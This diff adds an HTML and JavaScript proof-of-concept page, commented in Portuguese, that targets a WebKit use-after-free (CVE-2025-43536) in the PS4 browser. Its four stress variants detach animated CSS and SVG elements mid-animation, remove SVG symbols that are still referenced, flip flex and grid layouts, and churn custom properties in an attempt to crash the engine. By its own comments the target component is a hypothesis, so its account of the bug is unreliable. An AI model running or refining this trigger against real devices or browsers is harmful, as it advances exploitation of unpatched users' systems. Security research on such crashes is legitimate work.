@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2025-43536
+  Tipo: Use-After-Free — WebKit WebCore
+  Pesquisador: Nan Wang (@eternalsakura13)
+  Fix: "improved memory management" (Bugzilla 301726)
+  Advisory: Safari 26.2, Dezembro 2025
+  
+  HIPÓTESE DO COMPONENTE:
+  Nan Wang é especialista em CSS layout engine e SVG animation.
+  UAF com fix "improved memory management" em Bugzilla 301726
+  aponta para objeto CSS/SVG sendo liberado enquanto ainda
+  referenciado por outra parte do engine (animation timeline,
+  layout tree, ou style resolver).
+  
+  ESTRATÉGIA DE TRIGGER:
+  Padrão clássico de UAF em CSS/SVG:
+  1. Criar objeto (elemento SVG ou CSS animated element)
+  2. Disparar garbage collection / layout reflow
+  3. Remover referência do objeto do DOM
+  4. Acessar objeto via referência pendente (event listener,
+     animation callback, intersection observer, etc.)
+  
+  Como testar no PS4:
+  - Hospedar em HTTP local, apontar DNS do PS4
+  - Abrir no browser do PS4 (User's Guide ou URL direta)
+  - Crash/reload do browser = BUG PRESENTE
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-43536 PoC — UAF CSS/SVG</title>
+<style>
+  body { background:#0a0a0a; color:#00ffcc; font-family:monospace; padding:16px; }
+  #log { background:#111; border:1px solid #00ffcc; padding:12px;
+         height:320px; overflow-y:auto; font-size:12px; }
+  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+
+  /* CSS que será manipulado durante o trigger */
+  .animated-target {
+    width: 100px; height: 100px;
+    background: red;
+    animation: spin 0.1s linear infinite;
+    position: absolute;
+  }
+  @keyframes spin {
+    from { transform: rotate(0deg) translateX(10px); }
+    to   { transform: rotate(360deg) translateX(10px); }
+  }
+  .flex-container {
+    display: flex;
+    flex-wrap: wrap;
+    position: relative;
+    width: 200px;
+    height: 200px;
+    overflow: hidden;
+  }
+  .grid-container {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    grid-template-rows: repeat(5, 1fr);
+    position: absolute; top:-9999px;
+  }
+</style>
+</head>
+<body>
+<h3>CVE-2025-43536 — Use-After-Free CSS/SVG (Nan Wang)</h3>
+<div id="log"></div>
+<div id="stage" style="position:relative;overflow:hidden;width:1px;height:1px;"></div>
+
+<script>
+"use strict";
+const L = (m,c)=>{ const d=document.getElementById('log');
+  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
+  d.scrollTop=d.scrollHeight; };
+
+L("=== CVE-2025-43536 PoC Iniciado ===");
+const stage = document.getElementById('stage');
+
+// =============================================================
+// VARIANTE 1: CSS Animation UAF via requestAnimationFrame
+// Padrão: criar elemento animado → remover do DOM →
+// acessar via animação ativa
+// =============================================================
+function variant1_css_animation_uaf() {
+  return new Promise(resolve => {
+    L("[V1] CSS Animation UAF — criando elementos animados...");
+    const elements = [];
+    const BATCH = 80;
+
+    // Criar batch de elementos animados
+    for (let i = 0; i < BATCH; i++) {
+      const el = document.createElement('div');
+      el.className = 'animated-target';
+      el.style.left = (i % 10) * 10 + 'px';
+      el.style.top  = Math.floor(i / 10) * 10 + 'px';
+      stage.appendChild(el);
+      elements.push(el);
+    }
+
+    // Aguardar animações começarem
+    requestAnimationFrame(() => {
+      requestAnimationFrame(() => {
+        // Remover elementos enquanto animações ativas
+        // (animation objects ainda vivos na timeline)
+        for (let i = 0; i < BATCH; i++) {
+          if (elements[i].parentNode) {
+            stage.removeChild(elements[i]);
+          }
+        }
+
+        // Forçar layout reflow imediato (pode acessar
+        // objetos de animação já liberados)
+        void stage.offsetWidth;
+        void stage.getBoundingClientRect();
+
+        // Re-adicionar para forçar re-check de animações
+        for (let i = 0; i < 20; i++) {
+          const el = document.createElement('div');
+          el.className = 'animated-target';
+          stage.appendChild(el);
+          // Forçar style recalc no mesmo frame
+          void el.getAnimations();
+          stage.removeChild(el);
+        }
+
+        L("[V1] Fase 1 completa");
+
+        // Fase 2: Web Animations API explícita
+        for (let i = 0; i < 50; i++) {
+          const el = document.createElement('div');
+          el.style.cssText = 'position:absolute;width:10px;height:10px;background:blue';
+          stage.appendChild(el);
+
+          const anim = el.animate([
+            { transform: 'rotate(0deg)', opacity: 1 },
+            { transform: 'rotate(360deg)', opacity: 0 }
+          ], { duration: 100, iterations: Infinity });
+
+          // Remover elemento mas manter referência à animação
+          stage.removeChild(el);
+
+          // Acessar animação após remoção do elemento
+          try {
+            anim.currentTime = 50;
+            const effect = anim.effect;
+            if (effect) effect.getComputedTiming();
+          } catch(e) { /* ignorar erros esperados */ }
+
+          anim.cancel();
+        }
+
+        L("[V1] Fase 2 completa — Web Animations API stress OK", "ok");
+        resolve();
+      });
+    });
+  });
+}
+
+// =============================================================
+// VARIANTE 2: SVG Animation + DOM manipulation UAF
+// =============================================================
+function variant2_svg_animation_uaf() {
+  return new Promise(resolve => {
+    L("[V2] SVG Animation UAF...");
+
+    const svgNS = "http://www.w3.org/2000/svg";
+
+    for (let iter = 0; iter < 30; iter++) {
+      // Criar SVG com animações SMIL
+      const svg = document.createElementNS(svgNS, 'svg');
+      svg.setAttribute('width', '100');
+      svg.setAttribute('height', '100');
+      svg.style.cssText = 'position:absolute;top:-9999px';
+
+      const rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('x', '10'); rect.setAttribute('y', '10');
+      rect.setAttribute('width', '80'); rect.setAttribute('height', '80');
+      rect.setAttribute('fill', 'red');
+
+      // SMIL animate element
+      const animateColor = document.createElementNS(svgNS, 'animate');
+      animateColor.setAttribute('attributeName', 'fill');
+      animateColor.setAttribute('values', 'red;blue;green;red');
+      animateColor.setAttribute('dur', '0.1s');
+      animateColor.setAttribute('repeatCount', 'indefinite');
+
+      // animateTransform
+      const animateT = document.createElementNS(svgNS, 'animateTransform');
+      animateT.setAttribute('attributeName', 'transform');
+      animateT.setAttribute('type', 'rotate');
+      animateT.setAttribute('from', '0 50 50');
+      animateT.setAttribute('to', '360 50 50');
+      animateT.setAttribute('dur', '0.05s');
+      animateT.setAttribute('repeatCount', 'indefinite');
+
+      rect.appendChild(animateColor);
+      rect.appendChild(animateT);
+
+      // animateMotion
+      const animateM = document.createElementNS(svgNS, 'animateMotion');
+      animateM.setAttribute('path', 'M 0 0 Q 50 50 100 0');
+      animateM.setAttribute('dur', '0.1s');
+      animateM.setAttribute('repeatCount', 'indefinite');
+      rect.appendChild(animateM);
+
+      svg.appendChild(rect);
+      document.body.appendChild(svg);
+
+      // Forçar layout
+      void svg.getBoundingClientRect();
+
+      // Remover SVG com animações ativas
+      document.body.removeChild(svg);
+
+      // Forçar GC indiretamente via alocação
+      const tmp = new Array(1000).fill(0).map(() => ({ x: Math.random() }));
+      void tmp.length;
+    }
+
+    // Fase 2: SVG use element referencing removed content
+    const svg2 = document.createElementNS(svgNS, 'svg');
+    svg2.setAttribute('width', '200'); svg2.setAttribute('height', '200');
+    svg2.style.cssText = 'position:absolute;top:-9999px';
+
+    const defs = document.createElementNS(svgNS, 'defs');
+    const symbol = document.createElementNS(svgNS, 'symbol');
+    symbol.setAttribute('id', 'sym-test');
+
+    for (let i = 0; i < 20; i++) {
+      const path = document.createElementNS(svgNS, 'path');
+      path.setAttribute('d', `M${i} ${i} L${i+10} ${i+10}`);
+      const anim = document.createElementNS(svgNS, 'animate');
+      anim.setAttribute('attributeName', 'd');
+      anim.setAttribute('values', `M0 0 L10 10;M${i*2} 0 L10 10`);
+      anim.setAttribute('dur', '0.1s');
+      anim.setAttribute('repeatCount', 'indefinite');
+      path.appendChild(anim);
+      symbol.appendChild(path);
+    }
+    defs.appendChild(symbol);
+    svg2.appendChild(defs);
+
+    // Criar múltiplos <use> referenciando o symbol
+    for (let i = 0; i < 30; i++) {
+      const use = document.createElementNS(svgNS, 'use');
+      use.setAttribute('href', '#sym-test');
+      use.setAttribute('x', String(i * 5));
+      svg2.appendChild(use);
+    }
+
+    document.body.appendChild(svg2);
+    void svg2.getBoundingClientRect();
+
+    // Remover o symbol enquanto os <use> ainda referenciam
+    svg2.querySelector('defs').removeChild(symbol);
+    void svg2.getBoundingClientRect(); // forçar re-render com referência inválida
+
+    document.body.removeChild(svg2);
+
+    L("[V2] SVG Animation + use element stress OK", "ok");
+    resolve();
+  });
+}
+
+// =============================================================
+// VARIANTE 3: CSS Flexbox/Grid Layout UAF
+// Nan Wang historicamente reportou bugs em Layout Engine
+// =============================================================
+function variant3_layout_uaf() {
+  return new Promise(resolve => {
+    L("[V3] CSS Layout UAF — Flexbox/Grid stress...");
+
+    for (let iter = 0; iter < 50; iter++) {
+      const container = document.createElement('div');
+      container.className = 'flex-container';
+      document.body.appendChild(container);
+
+      const children = [];
+      for (let i = 0; i < 30; i++) {
+        const child = document.createElement('div');
+        child.style.cssText = `
+          flex: ${Math.random() > 0.5 ? '1 1 auto' : '0 0 ' + (i*3) + 'px'};
+          height: ${10 + i}px;
+          min-width: ${i}px;
+          max-width: ${100 + i*2}px;
+          margin: ${i % 3}px;
+          padding: ${i % 5}px;
+          box-sizing: border-box;
+          position: ${Math.random() > 0.7 ? 'relative' : 'static'};
+          align-self: ${['flex-start','flex-end','center','stretch'][i%4]};
+          overflow: ${Math.random() > 0.5 ? 'hidden' : 'visible'};
+        `;
+        container.appendChild(child);
+        children.push(child);
+      }
+
+      // Forçar layout
+      void container.scrollWidth;
+
+      // Mudar para grid no meio do layout
+      container.style.display = 'grid';
+      container.style.gridTemplateColumns = 'repeat(auto-fill, minmax(20px, 1fr))';
+      void container.scrollHeight;
+
+      // Remover filhos aleatórios durante reflow
+      for (let i = children.length - 1; i >= 0; i -= 2) {
+        if (children[i].parentNode) container.removeChild(children[i]);
+        void container.offsetWidth; // forçar layout incremental
+      }
+
+      // Mudar de volta para flex
+      container.style.display = 'flex';
+      container.style.flexWrap = 'wrap';
+      void container.getBoundingClientRect();
+
+      document.body.removeChild(container);
+    }
+
+    // Fase 2: ResizeObserver + layout mutation
+    const obs_container = document.createElement('div');
+    obs_container.style.cssText = 'width:100px;height:100px;overflow:hidden;position:absolute;top:-9999px';
+    document.body.appendChild(obs_container);
+
+    let obsCount = 0;
+    const ro = new ResizeObserver(entries => {
+      obsCount++;
+      for (const entry of entries) {
+        // Modificar layout dentro do callback do ResizeObserver
+        // (pode causar UAF se o objeto layout foi reciclado)
+        try {
+          entry.target.style.width = (50 + obsCount % 100) + 'px';
+          void entry.contentRect.width;
+        } catch(e) {}
+      }
+      if (obsCount > 200) ro.disconnect();
+    });
+    ro.observe(obs_container);
+
+    // Disparar múltiplos resize events
+    let w = 100;
+    const interval = setInterval(() => {
+      obs_container.style.width = (w = (w % 200) + 1) + 'px';
+      if (w > 190) {
+        clearInterval(interval);
+        ro.disconnect();
+        document.body.removeChild(obs_container);
+        L("[V3] Layout UAF stress OK", "ok");
+        resolve();
+      }
+    }, 1);
+  });
+}
+
+// =============================================================
+// VARIANTE 4: CSS Custom Properties + Paint Worklet (se disponível)
+// =============================================================
+function variant4_css_custom_props() {
+  return new Promise(resolve => {
+    L("[V4] CSS Custom Properties + transitions UAF...");
+
+    const container = document.createElement('div');
+    container.style.cssText = 'position:absolute;top:-9999px;width:500px';
+    document.body.appendChild(container);
+
+    const elements = [];
+    for (let i = 0; i < 100; i++) {
+      const el = document.createElement('div');
+      el.style.cssText = `
+        --color-${i}: hsl(${i*3.6}, 80%, 50%);
+        --size-${i}: ${10 + i}px;
+        width: var(--size-${i});
+        height: var(--size-${i});
+        background: var(--color-${i});
+        transition: all 0.05s ease;
+        transform: translateZ(0);
+      `;
+      container.appendChild(el);
+      elements.push(el);
+    }
+
+    void container.offsetWidth;
+
+    // Mudar propriedades customizadas rapidamente
+    let frame = 0;
+    function mutate() {
+      if (frame > 300) {
+        document.body.removeChild(container);
+        L("[V4] CSS Custom Properties stress OK", "ok");
+        resolve();
+        return;
+      }
+      for (let i = 0; i < elements.length; i++) {
+        if (elements[i].parentNode) {
+          elements[i].style.setProperty(`--size-${i}`, (10 + (frame + i) % 50) + 'px');
+          elements[i].style.setProperty(`--color-${i}`, `hsl(${(frame*3+i*10)%360}, 80%, 50%)`);
+          // Remover e readicionar alguns elementos durante transition
+          if (frame % 30 === 0 && i % 5 === 0) {
+            container.removeChild(elements[i]);
+            container.appendChild(elements[i]);
+          }
+        }
+      }
+      void container.getBoundingClientRect();
+      frame++;
+      requestAnimationFrame(mutate);
+    }
+    requestAnimationFrame(mutate);
+  });
+}
+
+// =============================================================
+// Executor principal
+// =============================================================
+async function main() {
+  try {
+    await variant1_css_animation_uaf();
+    await variant2_svg_animation_uaf();
+    await variant3_layout_uaf();
+    await variant4_css_custom_props();
+
+    L("=== COMPLETO: Nenhum crash JS detectado ===", "ok");
+    L("Crash do browser = CVE-2025-43536 PRESENTE no PS4 13.04", "crash");
+    L("Sem crash = patched ou trigger precisa refinamento", "info");
+  } catch(e) {
+    L("EXCEÇÃO: " + e.toString(), "fail");
+    L("Stack: " + (e.stack||'N/A'), "fail");
+  }
+}
+
+window.addEventListener('load', () => setTimeout(main, 300));
+</script>
+</body>
+</html>
